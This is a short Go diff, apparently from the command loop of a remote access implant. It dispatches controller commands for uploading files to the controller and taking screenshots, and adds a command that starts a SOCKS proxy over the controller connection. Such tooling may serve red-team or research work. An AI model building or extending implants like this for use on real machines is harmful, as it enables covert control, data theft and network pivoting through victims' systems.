@@ -35,10 +35,15 @@ func main() {
 			resp = modules.UploadFileToController(cmdReq.GetDownloadFileRequest())
 		case pb.SCREENSHOT_CMD_TYPE:
 			resp = modules.Screenshot(cmdReq.GetScreenshotRequest())
+		case pb.START_SOCKS_CMD_TYPE:
+			resp = modules.StartSocksServer(cmdReq.GetStartSocksServerRequest(), controller.Conn)
 		}
 		err = controller.WriteCommandResponse(resp)
 		if err != nil {
 			log.Printf("Failed to write command response: %v", err)
+		}
+		if cmdReq.Type == pb.START_SOCKS_CMD_TYPE {
+			select {}
 		}
 	}
 }
